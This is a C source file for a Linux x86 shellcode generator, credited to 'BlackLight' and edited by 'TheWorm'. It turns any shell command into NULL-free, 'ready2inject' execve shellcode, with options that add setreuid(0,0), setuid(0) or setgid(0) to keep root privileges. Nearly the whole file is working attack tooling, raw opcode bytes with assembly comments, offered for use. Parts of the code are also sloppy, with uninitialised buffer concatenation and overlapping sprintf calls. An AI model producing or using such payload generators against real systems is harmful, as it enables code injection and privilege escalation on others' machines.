/*
 * =====================================================================================
 *
 *       Filename:  generateShell.c
 *
 *    Description:  This is used to generate shellcode.  
 *
 *        Version:  1.0
 *        Created:  12/12/2012 11:03:43 PM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Ming Lee (), cloudniw1@gmail.com
 *   Organization:  
 *
 * =====================================================================================
 */
#include <stdlib.h>
/* *
 *  *
 *   * BlackLight's shellcode generator for Linux x86
 *    * Tested anywhere, working & NULL-free
 *     *
 *      * Usage: ./generator <cmd>
 *       * ...and then you've got a ready2inject NULL-free shellcode for the
 *       command you like
 *        *
 *         * copyleft 2008 by BlackLight <blacklight[at]autistici.org>
 *          * < http://blacklight.gotdns.org >
 *           *
 *            * Released under GPL v.3 licence
 *             *
 *              * Greetz to: evilsocket, for the idea he gave me   ;) 
 *               * Greetz to: my friends, who tested, used and appreciated this code and
 *               helped
 *                *      me to improve it to what it is now
 *                 * Greetz to: my girl, next to me in any moment even if she had no idea
 *                  *      about what I was doing ^^
 *                   */

/* *
 *  *
 *   * Edited by: TheWorm <theworm[at]autistici.org>
 *    * Date:      12/07/2009
 *     *
 *      * Changelog:
 *       * - original shellcode 2 bytes shorter (it's not much, I know...)
 *        * - added possibility to choose custom shellcodes with command line options
 *         * - minor fixes
 *          *
 *           */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main (int argc, char **argv)  {

	if (!argv[1]) {
		printf("Use: %s <option> command\n\n"
				"Options:\n"
				"     -r   add setreuid(0,0) to the shellcode\n"
				"     -u   add setuid(0)\n"
				"     -g   add setgid(0)\n"
				"     -ug  add setuid(0) and setgid(0)\n", argv[0]);
		exit(1);
	}

	char code[0x100] = {0};

	char base[] =
		"\\x52"				// push	%edx
		"\\x68\\x6e\\x2f\\x73\\x68"	// push	$0x68732f6e
		"\\x68\\x2f\\x2f\\x62\\x69"	// push	$0x69622f2f
		"\\x89\\xe3"			// mov	%esp,%ebx
		"\\x52"				// push	%edx
		"\\x68\\x2d\\x63\\x63\\x63"	// push	$0x6363632d
		"\\x89\\xe1"			// mov	%esp,%ecx
		"\\x52"				// push	%edx
		"\\xeb\\x07"			// jmp	cmd
		"\\x51"				// push	%ecx
		"\\x53"				// push	%ebx
		"\\x89\\xe1"			// mov	%esp,%ecx
		"\\xcd\\x80"			// int	$0x80
		"\\x61"				// popa
		"\\xe8\\xf4\\xff\\xff\\xff";	// call	l1

	int opt;

	if (strcmp(argv[1],"-r")==0) {
		sprintf(code,
				"\\x60"                           // pusha
				"\\x31\\xc0"			// xor	%eax,%eax
				"\\x99"				// cltd
				"\\xb0\\x46"			// mov	$0x46,%al
				"\\x31\\xdb"			// xor	%ebx,%ebx
				"\\x31\\xc9"			// xor	%ecx,%ecx
				"\\xcd\\x80"			// int	$0x80
				"\\xb0\\x0b"                      // mov  $0x0b,%al
				"%s",base);
		opt=2;
	} else if (strcmp(argv[1],"-u")==0) {
		sprintf(code,
				"\\x60"                           // pusha
				"\\x31\\xc0"			// xor	%eax,%eax
				"\\x99"				// cltd
				"\\xb0\\x17"			// mov	$0x17,%al
				"\\x31\\xdb"			// xor	%ebx,%ebx
				"\\xcd\\x80"			// int	$0x80
				"\\xb0\\x0b"                      // mov  $0x0b,%al
				"%s",base);
		opt=2;
	} else if (strcmp(argv[1],"-g")==0) {
		sprintf(code,
				"\\x60"                           // pusha
				"\\x31\\xc0"			// xor	%eax,%eax
				"\\x99"				// cltd
				"\\xb0\\x2e"			// mov  $0x2e,%al
				"\\x31\\xdb"			// xor  %ebx,%ebx
				"\\xcd\\x80"			// int  $0x80
				"\\xb0\\x0b"                      // mov  $0x0b,%al
				"%s",base);
		opt=2;
	} else if (strcmp(argv[1],"-ug")==0) {
		sprintf(code,
				"\\x60"                           // pusha
				"\\x31\\xc0"			// xor	%eax,%eax
				"\\x99"				// cltd
				"\\xb0\\x17"			// mov	$0x17,%al
				"\\x31\\xdb"			// xor	%ebx,%ebx
				"\\xcd\\x80"			// int	$0x80
				"\\xb0\\x2e"			// mov	$0x2e,%al
				"\\xcd\\x80"			// int	$0x80
				"\\xb0\\x0b"                      // mov  $0x0b,%al
				"%s",base);
		opt=2;
	} else {
		sprintf(code,
				"\\x60"				// pusha
				"\\x6a\\x0b"                      // push	$0x0b
				"\\x58"				// pop	%eax
				"\\x99"				// cltd
				"%s",base);
		opt=1;
	}

	int i,len=0;
	char *shell,*cmd;

	for (i=opt; i<argc; i++)
		len += strlen(argv[i]);
	len += argc;

	cmd = (char*) malloc(len);

	for (i=opt; i<argc; i++)  {
		strcat (cmd,argv[i]);
		strcat (cmd,"\x20");
	}

	cmd[strlen(cmd)-1]=0;
	shell = (char*) malloc( sizeof(code) + (strlen(argv[opt]))*5 + 1 );
	memcpy (shell,code,sizeof(code));

	for (i=0; i<strlen(cmd); i++)
		sprintf (shell,"%s\\x%.2x",shell,cmd[i]);
	printf ("Size: %d bytes\n%s\n",strlen(shell)/4,shell);

	return 0;
}
